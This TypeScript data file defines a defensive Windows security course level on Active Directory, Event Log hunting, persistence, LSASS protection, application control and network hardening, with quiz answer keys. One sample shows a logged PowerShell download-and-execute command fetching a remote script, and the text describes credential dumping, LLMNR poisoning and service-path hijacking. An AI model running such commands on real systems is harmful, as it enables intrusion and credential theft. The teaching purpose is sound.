import type { Level } from '../types'

const level: Level = {
  id: 'amateur',
  title: 'Logging, persistence and hardening Windows',
  summary:
    'Turn a Windows box into one that talks and holds. Active Directory in outline, deeper Event Log analysis, the logging you must turn on (process command lines, PowerShell, Sysmon), the many persistence spots attackers use, security policy, protecting credentials in LSASS, application control, and a hardened workstation baseline.',
  outcomes: [
    'Understand Active Directory’s parts and why it is the target',
    'Analyse the Event Log with filters and enable the logging that matters',
    'Hunt persistence across tasks, services, autoruns and the Registry',
    'Configure security policy: passwords, audit and user rights',
    'Explain why LSASS is attacked and how to protect credentials',
    'Apply application control, BitLocker and network hardening',
  ],
  steps: [
    {
      id: 'bwin-a-01',
      title: 'Active Directory in outline',
      read: `Most business Windows is not a pile of standalone PCs — it is an **Active Directory (AD)** domain: central identity and management for users and computers. You need the map now; the skilled and pro levels go deep.

## The pieces

- **Domain** — a boundary of shared identity and policy (e.g. \`corp.example.com\`). Users and computers are members.
- **Domain Controller (DC)** — a server running AD; it holds the directory database and authenticates logons. Compromising a DC is compromising the whole domain.
- **Domain accounts** — one identity that works across every domain-joined machine, instead of separate local accounts everywhere.
- **Groups** — especially **Domain Admins** (full control of the domain — the crown jewels), plus Enterprise Admins and other privileged groups.
- **Group Policy (GPO)** — central configuration pushed to all members: password rules, security settings, software. Defenders harden at scale through GPO.
- **Kerberos** — the domain's authentication protocol (tickets, not passwords on the wire). Its quirks are heavily targeted; you will study them later.

## Why AD is *the* target

An attacker who gets into one workstation wants to move toward the DC, because **Domain Admin means everything**: every machine, every account, every file. Almost all serious enterprise intrusions become a race for AD dominance. So a huge part of Windows defence is (1) making that lateral movement and escalation hard, and (2) detecting it early.

## The defender's north star

Protect the identities and paths that lead to Domain Admin: limit who holds privileged group membership, tier your admin accounts (don't use a Domain Admin to browse the web on a workstation), monitor the DCs closely, and assume any workstation can fall — so make the step from "one workstation" to "the domain" as long and loud as possible.`,
      sample: {
        lang: 'text',
        caption: 'Why the domain is the prize',
        code: `Standalone PCs:            Active Directory domain:
  attacker pops PC-A         attacker pops PC-A (a workstation)
  -> owns PC-A only            -> hunts toward a Domain Controller
  -> must attack each          -> gets Domain Admin
     machine separately        -> owns EVERY machine and account
                                  in the domain at once

The whole game: keep the path from one workstation to
Domain Admin long, hard, and heavily monitored.`,
        output: `"Domain Admin" is not just another admin — it is control of
every domain-joined system. That is why AD is attacked and
why defending the road to it is central to Windows security.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is gaining membership of the Domain Admins group the objective of most serious attacks on a Windows enterprise?',
        options: [
          'It grants a faster internet connection',
          'Domain Admin confers control over the entire domain — every domain-joined computer, user account and resource — so reaching it turns a single foothold into control of the whole environment',
          'It is the only account that can run PowerShell',
          'It disables Windows Update',
        ],
        answer: 1,
        explain:
          'Active Directory centralises identity, so the privileged domain groups control everything the domain contains. An attacker who becomes Domain Admin owns every machine and account at once, which is why intrusions converge on that goal and why defenders concentrate on lengthening, hardening and monitoring the path from any single host to domain dominance.',
        hint: 'What exactly does control of the domain give an attacker, compared with control of one PC?',
      },
    },

    {
      id: 'bwin-a-02',
      title: 'Reading the Event Log like a defender',
      read: `\`Get-WinEvent\` is the tool; the skill is asking precise questions and knowing which events answer them.

## Filter at the source

Pulling every event and filtering in PowerShell is slow. \`-FilterHashtable\` filters inside the log engine, which is fast even on huge logs:

\`\`\`
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4624;
  StartTime=(Get-Date).AddHours(-1) }
\`\`\`

For anything complex, an **XPath** filter (\`-FilterXPath\`) or an XML filter gives full control.

## Logon types tell the story (Event 4624)

A successful logon (4624) carries a **Logon Type** that says *how*:

- **2** — Interactive (someone at the keyboard).
- **3** — Network (accessing a share, or authenticating across the network).
- **10** — RemoteInteractive (**RDP**).
- **4 / 5** — Scheduled task / service.
- **7** — Unlock; **8/9** — network/newcredentials.

A Type-10 (RDP) logon at 3am from an unusual account, or a Type-3 from a workstation that never initiates network logons, is the kind of thing hunting surfaces.

## The events worth memorising

- **4625** failed logon; **4624** success (with logon type).
- **4672** "special privileges assigned" — an admin-level logon; a burst can indicate privileged use.
- **4688** process creation (enable command-line capture — next step).
- **4720/4726** account created/deleted; **4728/4732/4756** added to a (global/local/universal) admin group.
- **4740** account locked out; **1102** Security log cleared.

## The instinct

You rarely browse the log; you interrogate it. "Show me RDP logons for this account this week." "Who was added to any admin group in the last 24h?" "Was the log cleared?" \`Get-WinEvent\` plus the right Event ID and filter is how you turn millions of lines into an answer — the Windows form of the grep/awk instinct.`,
      sample: {
        lang: 'powershell',
        caption: 'Successful RDP logons (Type 10) this week — who and from where',
        code: `Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4624;
  StartTime=(Get-Date).AddDays(-7) } |
  Where-Object { $_.Properties[8].Value -eq 10 } |   # LogonType = 10 (RDP)
  ForEach-Object {
    [pscustomobject]@{
      Time = $_.TimeCreated
      User = $_.Properties[5].Value
      From = $_.Properties[18].Value   # source network address
    }
  } | Format-Table -Auto`,
        output: `Time                User      From
----                ----      ----
6/17/2024 09:12:03  student   192.168.1.50
6/18/2024 03:44:21  support   203.0.113.9   <- RDP at 3am from a
                                              public IP: investigate`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A successful logon event (4624) shows Logon Type 10. What does that tell an investigator?',
        options: [
          'It was a service starting',
          'It was a RemoteInteractive (RDP) logon — someone logged on over Remote Desktop — which is worth scrutinising for unusual accounts, times, or source addresses',
          'It was a failed logon',
          'The account was created',
        ],
        answer: 1,
        explain:
          'Logon Type encodes *how* the logon happened. Type 10 is RemoteInteractive — an RDP session. Because RDP is a favourite attacker access method, Type-10 logons deserve attention: which account, at what time, from what source IP? An off-hours Type-10 from a public address to a privileged account is exactly the pattern hunting looks for.',
        hint: 'Types map to methods: 2 is at the keyboard, 3 is network — what is 10?',
      },
    },

    {
      id: 'bwin-a-03',
      title: 'Turning on the logging that matters',
      read: `Windows' default logging misses much of what a defender needs. Several high-value sources are **off until you enable them** — a critical amateur-level task, because you cannot detect what you never recorded.

## Command-line process auditing (4688)

Event 4688 (process creation) is far more useful with the **command line** captured. Enable "Include command line in process creation events" (via GPO/Registry) and now you see not just that \`powershell.exe\` ran, but the full command — often revealing the malicious intent (encoded commands, downloads, LOLBin abuse).

## PowerShell logging

Attackers love PowerShell, so log it:

- **Script Block Logging** (Event **4104** in the PowerShell/Operational log) records the actual code executed, even if obfuscated — Windows logs the de-obfuscated block.
- **Module Logging** and **Transcription** add further coverage.

This is one of the best returns on a config change for detecting modern attacks.

## Sysmon

**Sysmon** (a free Sysinternals tool) dramatically enriches telemetry, logging with far more detail than built-in events:

- Process creation *with hashes and parent process* (Event 1).
- Network connections per process (Event 3).
- File creation, registry changes, image loads, and more.

Sysmon with a good configuration (community ones like SwiftOnSecurity's are a fine start) turns a Windows box into a rich sensor — the foundation many detections depend on.

## The principle

Detection is impossible without telemetry. Before writing clever rules, make sure the events those rules need are actually being generated: 4688 with command lines, PowerShell 4104, and Sysmon. Enabling logging is unglamorous and is the single most important detection prerequisite on Windows.`,
      sample: {
        lang: 'text',
        caption: 'The same attack, before and after enabling command-line logging',
        code: `Default 4688 (no command line):
  A new process has been created.
  New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\...\\powershell.exe
  # ...tells you almost nothing about what it did.

With command-line auditing enabled (and PowerShell 4104):
  New Process Name: ...\\powershell.exe
  Process Command Line: powershell -nop -w hidden -enc SQBFAFgA...
  4104 ScriptBlock: IEX (New-Object Net.WebClient).DownloadString(
        'http://203.0.113.9/a.ps1')   <- de-obfuscated intent`,
        output: `Command-line + PowerShell logging turn "powershell ran" into
"powershell downloaded and executed a remote script" — the
difference between a useless event and a detection.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'PowerShell Script Block Logging (Event 4104) is valuable against attackers who obfuscate their commands. Why?',
        options: [
          'It blocks PowerShell from running',
          'Windows logs the actual script block as executed — after de-obfuscation — so even a heavily encoded or obfuscated command is recorded in readable form, revealing what it really did',
          'It only logs the command name, not the content',
          'It encrypts the logs',
        ],
        answer: 1,
        explain:
          'Script Block Logging captures the code the engine actually runs, so obfuscation and encoding (base64 `-enc`, string tricks) are logged in their de-obfuscated form. That defeats a primary attacker evasion — hiding intent in an unreadable command line — and is why enabling it (alongside command-line auditing and Sysmon) is a top detection-readiness step.',
        hint: 'At what point does PowerShell log the code — before or after it is de-obfuscated to run?',
      },
    },

    {
      id: 'bwin-a-04',
      title: 'Persistence: scheduled tasks and services',
      read: `As on Linux, attackers want to **survive reboots and logoffs**. Windows offers many persistence spots; two of the most common are scheduled tasks and services. Hunting them systematically is core blue-team work.

## Scheduled Tasks

The Task Scheduler runs programs on triggers (at logon, on a timer, on an event). Attackers create a task that relaunches their payload. Hunt with:

- \`Get-ScheduledTask\` — list tasks; look at **Actions** (what runs) and **Triggers** (when).
- \`schtasks /query /fo LIST /v\` — the classic tool.
- Watch for tasks running from user/temp folders, tasks with odd names impersonating Microsoft ones, and tasks that run PowerShell with encoded commands.

Events **4698** (task created) and **4702** (task updated) record changes — enable and watch them.

## Services (again, deeper)

You met services in the beginner level. For persistence, focus on:

- **Binary path** outside \`C:\\Windows\\System32\` or \`Program Files\` — especially temp/AppData.
- Service run as **LocalSystem** without need.
- **Unquoted service paths** — a path like \`C:\\Program Files\\My App\\svc.exe\` without quotes can let an attacker who can write \`C:\\Program.exe\` hijack it (a classic privilege-escalation *and* persistence bug you should find and fix).
- New services (Event **7045** in the System log — service installed) that you cannot account for.

## The systematic walk

Persistence hunting is a checklist, not inspiration — attackers plant several mechanisms so removing one leaves them inside. Tasks and services are two entries; the next step covers the fuller map. Correlate by time: persistence created during the intrusion clusters with the rest of the attacker's activity.`,
      sample: {
        lang: 'powershell',
        caption: 'Scheduled tasks whose action runs from a user or temp folder',
        code: `Get-ScheduledTask | ForEach-Object {
  $act = $_.Actions.Execute -join ';'
  if ($act -match 'Users|Temp|AppData|ProgramData') {
    [pscustomobject]@{ Task=$_.TaskName; Path=$_.TaskPath; Runs=$act }
  }
} | Format-List`,
        output: `Task : Updater
Path : \\
Runs : C:\\Users\\student\\AppData\\Roaming\\svch0st.exe   <- persistence

Task : OneDriveStandaloneUpdater      (legitimate, expected)
Path : \\
Runs : C:\\Users\\student\\AppData\\Local\\Microsoft\\OneDrive\\...`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is an "unquoted service path" like `C:\\Program Files\\My App\\svc.exe` (with no surrounding quotes) a security problem?',
        options: [
          'Windows cannot start unquoted services',
          'Windows may interpret the space and try `C:\\Program.exe` first, so an attacker who can write `C:\\Program.exe` could get it executed with the service’s privileges — enabling privilege escalation and persistence',
          'Unquoted paths run slower',
          'It only affects how the path is displayed',
        ],
        answer: 1,
        explain:
          'With an unquoted path containing spaces, Windows tries each partial path in turn: `C:\\Program.exe`, then `C:\\Program Files\\My.exe`, etc. If an attacker can drop `C:\\Program.exe`, the service (often LocalSystem) runs *their* binary at startup — both an escalation and a persistence mechanism. Finding and quoting service paths (or fixing the writable directory) is a standard hardening check.',
        hint: 'How does Windows parse a path with spaces when there are no quotes, and what could an attacker place at the first stop?',
      },
    },

    {
      id: 'bwin-a-05',
      title: 'The wider persistence map, and Autoruns',
      read: `Run keys, tasks and services are only the start. Windows has *dozens* of auto-start locations, and a thorough defender knows the map — or uses a tool that does.

## Sysinternals Autoruns

**Autoruns** (free, from Sysinternals) enumerates virtually every auto-start point on the system in one view: Run keys, services, scheduled tasks, drivers, logon scripts, Explorer add-ons, browser extensions, WMI subscriptions, and more. Killer features for a defender:

- **Verify signatures** — it flags entries not signed by a trusted publisher.
- **Hide Microsoft/Windows entries** — collapse the known-good so the unusual stands out.
- **VirusTotal integration** — check hashes against known malware.
- \`autorunsc\` — the command-line version, for scripting a fleet sweep.

## Persistence spots beyond the obvious

- **WMI event subscriptions** — a stealthy, fileless persistence favourite; a filter+consumer pair runs code on an event (e.g. at a certain time). \`Get-WmiObject -Namespace root\\Subscription\` to inspect.
- **Startup folders** — \`shell:startup\` (per-user) and the all-users startup folder run their contents at logon.
- **Logon scripts**, **AppInit_DLLs**, **Image File Execution Options** (a debugger set on a program runs the "debugger" instead — used to hijack, e.g., sticky keys), **Winlogon** keys.
- **Office add-ins and templates**, **browser extensions**.

## Why the map matters

Attackers pick less-watched spots precisely because defenders forget them. You do not need to memorise all forty — you need to (a) know they exist, so you are not fooled into thinking Run keys are the only place, and (b) use Autoruns to enumerate them all and focus on the unsigned, the unusual, and the recently changed. "Hide signed Microsoft entries, then look at what remains" is one of the most productive Windows hunts there is.`,
      sample: {
        lang: 'text',
        caption: 'Autoruns after hiding signed Microsoft entries — the survivors',
        code: `autorunsc -accepteula -a * -s -h -nobanner

Logon
  HKLM\\...\\Run
    Updater   c:\\users\\student\\appdata\\roaming\\svch0st.exe
      (Not Verified)   VirusTotal: 41/72
Tasks
  \\Updater   c:\\users\\...\\svch0st.exe   (Not Verified)
WMI
  root\\Subscription   __EventFilter "Sync"  ->  powershell -enc ...
      (fileless persistence)`,
        output: `Three linked persistence entries for one payload:
a Run key, a scheduled task, AND a WMI subscription.
Removing only one would leave the attacker inside.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A recommended Autoruns workflow is "hide signed Microsoft entries, then examine what remains". Why is that so effective for hunting persistence?',
        options: [
          'Microsoft entries are the malicious ones',
          'Most auto-start entries on a clean system are legitimate, signed Microsoft components; hiding those collapses the noise so that unsigned, unusual, or recently added entries — where malicious persistence lives — stand out for inspection',
          'It permanently deletes Microsoft software',
          'Unsigned entries are always safe',
        ],
        answer: 1,
        explain:
          'The vast majority of the dozens of auto-start entries are expected, signed OS components. Filtering them out leaves a short list of the unsigned and unusual, which is exactly where attacker persistence hides. Combined with signature verification and VirusTotal lookups, this "reduce to the anomalies" approach makes a huge search space tractable — the same frequency/outlier instinct as stacking.',
        hint: 'On a clean box, what is most of the auto-start list, and what are you left with after removing it?',
      },
    },

    {
      id: 'bwin-a-06',
      title: 'Security policy: passwords, audit and rights',
      read: `Windows enforces many security decisions through **policy** — locally via **Local Security Policy** (\`secpol.msc\`) and \`secedit\`, and across a domain via **Group Policy (GPO)**. Three policy areas are foundational.

## Password and lockout policy

Sets minimum length, complexity, history, maximum age, and account lockout thresholds. Modern guidance favours **length** (long passphrases) and MFA over forced frequent complexity changes. Lockout blunts brute-force but, set too aggressively, invites denial-of-service — tune with monitoring.

## Audit policy

This is what decides **which events get logged**. **Advanced Audit Policy** gives fine-grained control (e.g. audit "Process Creation", "Logon", "Account Management", "Object Access"). If auditing is not configured, the events you rely on for detection are never written — so audit policy is the switch behind all your Event Log hunting. Enable success/failure auditing for the categories that matter (logon, account management, privilege use, process creation).

## User Rights Assignment

Beyond file permissions, Windows has **privileges/rights** granting broad system abilities: "Log on as a service", "Back up files and directories" (bypasses ACLs!), "Debug programs" (**SeDebugPrivilege** — lets you read other processes' memory, e.g. LSASS), "Take ownership", "Load and unload drivers". These are assigned in policy. Defenders audit who holds the dangerous ones, because a seemingly non-admin account with "Back up files" or "Debug programs" can effectively become admin.

## The scale lever

On a domain, GPO applies all of this to thousands of machines consistently — the Windows equivalent of config-as-code. Hardening via GPO (a strong audit policy, restricted user rights, sane password/lockout settings, security options) is how you turn one hardened box into a hardened fleet, and how you keep it that way.`,
      sample: {
        lang: 'powershell',
        caption: 'Auditing who holds dangerous user rights (via secedit export)',
        code: `secedit /export /areas USER_RIGHTS /cfg rights.inf | Out-Null
Select-String -Path rights.inf -Pattern 'SeDebug|SeBackup|SeTakeOwnership'`,
        output: `SeDebugPrivilege = *S-1-5-32-544,*S-1-5-21-...-1108
#   Administrators AND a normal-looking account 1108:
#   1108 can read any process's memory (incl. LSASS) -> effectively admin
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551
SeTakeOwnershipPrivilege = *S-1-5-32-544`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why does audit policy sit "behind" all of your Event Log hunting?',
        options: [
          'It encrypts the Event Log',
          'Audit policy determines which categories of events Windows actually records; if the relevant auditing is not enabled, the events your detections depend on are never generated in the first place',
          'It controls who can read the logs',
          'It rotates the logs automatically',
        ],
        answer: 1,
        explain:
          'You can only hunt through events that exist. Audit policy (especially Advanced Audit Policy) is the switch that decides whether logon, account-management, privilege-use and process-creation events are written. Misconfigured auditing means silent blind spots no query can overcome — which is why configuring audit policy is a prerequisite for detection, exactly as enabling command-line and PowerShell logging is.',
        hint: 'If a category is not audited, does the event ever get written for you to search?',
      },
    },

    {
      id: 'bwin-a-07',
      title: 'LSASS and protecting credentials',
      read: `On Windows, the process **LSASS** (Local Security Authority Subsystem Service, \`lsass.exe\`) handles authentication — and, to enable single sign-on, it can hold **credential material** in memory: password hashes, Kerberos tickets, and sometimes more. That makes LSASS the single most valuable target on a compromised Windows host.

## The attack: credential theft

Tools like **Mimikatz** read LSASS memory to extract:

- **NTLM hashes** — usable directly in **pass-the-hash** attacks (authenticate as the user without knowing their password).
- **Kerberos tickets** — for **pass-the-ticket**.
- Sometimes plaintext (on older/misconfigured systems).

With a harvested Domain Admin hash or ticket, an attacker moves laterally and takes the domain. This is why so much Windows defence centres on protecting and monitoring LSASS.

## The defences

- **Credential Guard** — uses virtualization-based security to isolate LSASS secrets in a separate, protected environment the OS (and thus malware) cannot read. A major mitigation on modern Windows.
- **LSASS as a Protected Process Light (PPL / RunAsPPL)** — stops non-protected processes (including most credential dumpers) from opening LSASS memory.
- **Restrict SeDebugPrivilege** — reading another process's memory needs debug rights; limit who has them (from the last step).
- **Don't leave privileged creds on workstations** — **tiered admin**: never log a Domain Admin onto an ordinary workstation, because their credentials then sit in that box's LSASS waiting to be stolen. Use dedicated admin accounts and Privileged Access Workstations.
- **Detect the dumping** — access to LSASS by an unusual process is a high-fidelity alert (Sysmon Event 10 "ProcessAccess" targeting lsass.exe; some EDRs flag it directly).

## The mental model

Assume any credential that touches a machine can be stolen if that machine is compromised. So (1) keep powerful credentials off exposed machines, (2) isolate LSASS with Credential Guard/PPL, and (3) alert loudly when something reads LSASS. Credential theft from LSASS is the hinge of most enterprise breaches — defending it is disproportionately valuable.`,
      sample: {
        lang: 'powershell',
        caption: 'Confirming LSASS protections are on',
        code: `# Credential Guard running? (1 in the list = active)
$ns = "root\\Microsoft\\Windows\\DeviceGuard"
(Get-CimInstance Win32_DeviceGuard -Namespace $ns).SecurityServicesRunning

# LSASS running as a Protected Process (RunAsPPL)?
$lsa = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
Get-ItemProperty $lsa -Name RunAsPPL -EA SilentlyContinue | Select RunAsPPL`,
        output: `SecurityServicesRunning : {1, 2}   <- 1 = Credential Guard on
RunAsPPL                : 1        <- LSASS is a protected process
# With both on, ordinary credential dumpers cannot read LSASS memory.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is logging a Domain Admin account onto an ordinary user workstation a dangerous practice, even briefly?',
        options: [
          'It uses a domain license',
          'Their credentials (hashes/tickets) are then cached in that workstation’s LSASS memory, so if that machine is compromised an attacker can steal the Domain Admin credential and take over the domain — hence "tiered" admin keeps privileged logons off exposed machines',
          'Domain Admins cannot use workstations',
          'It slows the workstation down',
        ],
        answer: 1,
        explain:
          'Authenticating on a machine leaves credential material in its LSASS to enable single sign-on. If a workstation is compromised (they are the most exposed tier), an attacker dumps LSASS and now holds whatever logged on there — including a Domain Admin, which is game over. Tiered administration and Privileged Access Workstations exist precisely to prevent powerful credentials from ever landing on exposed hosts.',
        hint: 'Where do a user’s credentials sit after they log on, and what if that machine is the one that gets popped?',
      },
    },

    {
      id: 'bwin-a-08',
      title: 'Application control: AppLocker and WDAC',
      read: `Antivirus asks "is this file known-bad?" **Application control** flips it to "is this file explicitly allowed?" — a **default-deny** (allow-listing) approach that stops unknown and untrusted executables from running at all. It is one of the strongest preventive controls on Windows.

## The two technologies

- **AppLocker** — rules that permit or deny execution of apps, scripts, installers and DLLs, based on publisher (signature), path, or file hash. Manageable via GPO; a good, widely deployable option.
- **Windows Defender Application Control (WDAC)** — a newer, kernel-enforced, more robust policy engine (harder to bypass than AppLocker), better suited to high-security environments.

## Why allow-listing is powerful

If only approved, signed applications in trusted locations can run, then:

- Unknown malware simply **does not execute** — no signature needed, because it was never on the allow-list.
- Many "living off the land" and script-based attacks are blunted (especially with script rules).
- It directly counters the "user double-clicks a malicious attachment" chain.

## The catch: writable paths

A naive path rule like "allow anything in \`C:\\Windows\`" is unsafe, because there are **user-writable subdirectories** inside \`C:\\Windows\` where an attacker can drop and run a binary — bypassing the rule. Robust policies allow-list by **publisher/signature** (or hash) rather than broad paths, and specifically account for writable locations. Microsoft publishes lists of **LOLBins** to block even when signed (e.g. \`msbuild\`, \`installutil\`) because they can run arbitrary code.

## Where it fits

Application control is preventive and high-value but takes effort to deploy without breaking legitimate software (you audit first — run in audit mode, see what would be blocked, refine, then enforce, exactly like MAC on Linux). Combined with the detection you have been building, it moves you from "detect the malware after it runs" toward "the malware never runs".`,
      sample: {
        lang: 'text',
        caption: 'Why a broad path allow-rule fails, and the safer rule',
        code: `WEAK AppLocker rule:
  Allow: Everyone, path = C:\\Windows\\*
  -> attacker drops payload in C:\\Windows\\Tasks (user-writable)
     and it RUNS. The rule allowed it.

STRONG rule:
  Allow: publisher = "O=MICROSOFT CORPORATION, ..." (signed)
  Allow: specific hashes for needed unsigned tools
  Deny:  known abusable signed LOLBins (msbuild, installutil, ...)
  -> unknown/unsigned code cannot run, wherever it is dropped.`,
        output: `Allow-listing by signature/hash, not broad writable paths,
is what makes application control actually hold. Audit first,
then enforce.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What makes application control (AppLocker/WDAC) fundamentally different from — and complementary to — antivirus?',
        options: [
          'It is just a faster antivirus',
          'Antivirus blocks what it recognises as bad (default-allow); application control only permits explicitly approved apps (default-deny/allow-listing), so unknown malware never executes even without a signature for it',
          'It only scans email attachments',
          'It replaces the need for patching',
        ],
        answer: 1,
        explain:
          'AV is default-allow: everything runs unless recognised as malicious, so novel malware slips through. Application control is default-deny: nothing runs unless it is on the allow-list, so unknown/untrusted executables are blocked by default. That preventive posture stops entire classes of attack, and pairs with AV and detection rather than replacing them. Robust policies allow-list by signature/hash, not broad writable paths.',
        hint: 'One asks "is this known bad?"; the other asks "is this explicitly allowed?" Which stops brand-new malware?',
      },
    },

    {
      id: 'bwin-a-09',
      title: 'BitLocker and data at rest',
      read: `Permissions protect data from other *users* on a running system. They do nothing if someone **steals the disk** or boots the machine from a USB stick — then they read the raw filesystem and bypass Windows entirely. **Encryption at rest** is the answer, and on Windows that is **BitLocker**.

## What BitLocker does

It encrypts the whole volume, so the data is unreadable without the decryption key. Combined with the **TPM** (a hardware security chip), the key is released only if the boot process is intact and unmodified — so an attacker cannot simply move the drive to another machine or tamper with the boot chain to get in.

## Why it matters (Confidentiality)

- A stolen or lost laptop with BitLocker is a hardware loss, not a data breach — the thief gets an encrypted brick.
- It defeats "offline" attacks: booting another OS to read/modify the disk, resetting local passwords by editing the SAM, or pulling the drive to read it elsewhere.

## The key-management realities

- **Recovery keys** must be stored safely (in AD/Azure AD/Entra for domain-joined machines, or a secure vault) — lose the key and the data is gone even to you.
- **TPM + PIN** (requiring a PIN at boot) is stronger than TPM-only, which is vulnerable to certain physical attacks.
- BitLocker protects data **at rest**; once Windows is booted and unlocked, normal permissions apply — it is not a substitute for the access controls in the rest of this track.

## The pairing

Full-disk encryption (BitLocker) plus strong access controls (permissions, least privilege) plus the detection you have built covers the three states of data: at rest (encryption), in use (permissions/UAC/Credential Guard), and in transit (TLS, next levels). A laptop without disk encryption is one theft away from a breach no ACL can prevent.`,
      sample: {
        lang: 'powershell',
        caption: 'Checking BitLocker protection status on the system drive',
        code: `Get-BitLockerVolume -MountPoint "C:" |
  Select MountPoint, VolumeStatus, ProtectionStatus, EncryptionMethod`,
        output: `MountPoint VolumeStatus  ProtectionStatus EncryptionMethod
---------- ------------  ---------------- ----------------
C:         FullyEncrypted On               XtsAes256
# ProtectionStatus On + FullyEncrypted = a stolen disk is
# an encrypted brick. "Off" or "FullyDecrypted" = data at risk.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'A laptop’s files are protected by NTFS permissions but the disk is not encrypted. How can a thief who physically steals it read the data anyway?',
        options: [
          'They cannot — NTFS permissions always apply',
          'By booting the machine from another OS (or moving the drive to another computer), they access the raw filesystem directly and bypass Windows’ permission checks entirely — which is exactly what full-disk encryption like BitLocker prevents',
          'By guessing the user’s password only',
          'Permissions encrypt the disk automatically',
        ],
        answer: 1,
        explain:
          'NTFS permissions are enforced by a *running* Windows. Boot a different OS from USB, or put the drive in another machine, and none of that runs — the attacker reads the plaintext filesystem, resets local passwords by editing the SAM, or copies everything. Encryption at rest (BitLocker, ideally TPM+PIN) makes the volume unreadable without the key, turning a stolen device into an encrypted brick.',
        hint: 'Permissions are enforced by Windows while it runs. What if the attacker never boots your Windows?',
      },
    },

    {
      id: 'bwin-a-10',
      title: 'Network hardening: SMB, LLMNR and legacy protocols',
      read: `Windows networking includes several legacy protocols that are convenient, on by default, and dangerous. Turning off or tightening them removes some of the most reliable attacker techniques on internal networks.

## SMB (file sharing)

- **Disable SMBv1** everywhere. It is obsolete, unfixable, and the vehicle for WannaCry/EternalBlue. Modern Windows can remove the feature entirely (\`Disable-WindowsOptionalFeature ... SMB1Protocol\`).
- **Require SMB signing** to prevent tampering and relay attacks.
- Don't expose SMB (port 445) to the internet — ever.

## LLMNR and NBT-NS

**LLMNR** and **NetBIOS Name Service** are fallback name-resolution protocols. When a machine can't resolve a name via DNS, it *broadcasts* "who is \\\\fileserver?" to the local network. An attacker on that network simply answers "me!", the victim then tries to authenticate to the attacker, and the attacker captures the victim's **NTLMv2 hash** (tools: Responder). This poisoning is one of the most dependable internal attacks — and it is defeated by **disabling LLMNR and NBT-NS** (via GPO/registry), so machines stop broadcasting those questions.

## NTLM relay

Even without cracking the captured hash, an attacker can **relay** it to another service that accepts NTLM (a technique behind many AD compromises). Mitigations: SMB signing, LDAP signing/channel binding, and reducing/disabling NTLM in favour of Kerberos.

## The theme

Much of internal Windows compromise rides on **legacy defaults**: SMBv1, unsigned SMB, LLMNR/NBT-NS broadcasts, and NTLM. None are needed on a modern, well-run network, and each you remove deletes a whole class of attack. A hardening baseline that disables SMBv1, requires signing, kills LLMNR/NBT-NS, and curtails NTLM closes some of the widest-open doors on the average corporate LAN.`,
      sample: {
        lang: 'powershell',
        caption: 'Checking (and the fix for) the classic legacy exposures',
        code: `# is the obsolete SMBv1 still present?
Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol |
  Select FeatureName, State
# is SMB signing required?
Get-SmbServerConfiguration | Select RequireSecuritySignature
# is LLMNR disabled? (EnableMulticast = 0 means disabled)
$dns = "HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient"
Get-ItemProperty $dns -Name EnableMulticast -EA SilentlyContinue | Select EnableMulticast`,
        output: `FeatureName   State
-----------   -----
SMB1Protocol  Enabled     <- REMOVE it (EternalBlue vehicle)

RequireSecuritySignature : False   <- enable signing (relay defense)

EnableMulticast : (not set)  <- LLMNR still on: attacker can poison
                                 name resolution and steal NTLM hashes`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'How does an attacker abuse LLMNR/NBT-NS on a local network, and how do you shut the technique down?',
        options: [
          'They exploit a bug in DNS servers; patch the DNS server',
          'When a victim fails DNS resolution it broadcasts a name query; the attacker answers falsely, the victim tries to authenticate to the attacker, and its NTLMv2 hash is captured — disabling LLMNR and NBT-NS stops the broadcasts and defeats the poisoning',
          'They flood the network with traffic; add more bandwidth',
          'It only affects wireless networks; use Ethernet',
        ],
        answer: 1,
        explain:
          'LLMNR/NBT-NS are broadcast name-resolution fallbacks. An attacker running a poisoner (e.g. Responder) simply replies to those broadcasts as whatever host was asked for; the victim then authenticates to the attacker, handing over its NTLMv2 hash (to crack or relay). Because these protocols are legacy and rarely needed, disabling them via GPO removes the broadcasts and kills one of the most reliable internal attacks outright.',
        hint: 'What does a Windows box do when DNS fails, and what can an attacker on the same LAN reply?',
      },
    },

    {
      id: 'bwin-a-11',
      title: 'Baselining and change detection',
      read: `Detection depends on knowing **normal**. An amateur defender builds a **baseline** of a clean system and then watches for **change** — because attacker activity is, by definition, a deviation from the known-good state.

## What to baseline on Windows

Capture, on a known-clean machine (ideally your golden image), the things attackers alter:

- **Auto-starts** — the full Autoruns output (Run keys, services, tasks, WMI subs, drivers).
- **Services** — names, binary paths, run-as accounts, start types.
- **Local accounts and group membership** — who exists, who is admin.
- **Listening ports** — \`Get-NetTCPConnection -State Listen\`: what should answer.
- **Installed software and hotfixes.**
- **Key security settings** — Defender state/exclusions, firewall, audit policy, critical registry values.

Store the baseline **off the machine** (an attacker who edits the baseline hides their change — the AIDE lesson again).

## Detecting drift

Periodically re-capture and **diff** against the baseline. New service? New admin? New listening port? New auto-start? Each diff is a lead. \`Compare-Object\` makes this a one-liner in PowerShell, and the approach scales across a fleet: the machine that differs from its identical peers is the one to investigate (stacking).

## Why this is the amateur-to-skilled bridge

Beginners react to alerts; a baseline lets you *proactively* find what no alert caught, by comparing "what is" to "what should be". It is also how you validate hardening ("did the baseline actually get applied?") and how you make sense of an incident ("what changed since clean?"). Combined with the logging you enabled and the persistence map you learned, baselining turns a Windows host from something you inspect ad hoc into something whose deviations you can systematically detect.`,
      sample: {
        lang: 'powershell',
        caption: 'Baselining services, then diffing to find what changed',
        code: `# on a clean machine — capture the baseline (store it OFF-host)
Get-CimInstance Win32_Service |
  Select Name, PathName, StartName, StartMode |
  Export-Csv baseline-services.csv -NoTypeInformation

# later — compare the live system to the baseline
$base = Import-Csv baseline-services.csv
$now  = Get-CimInstance Win32_Service |
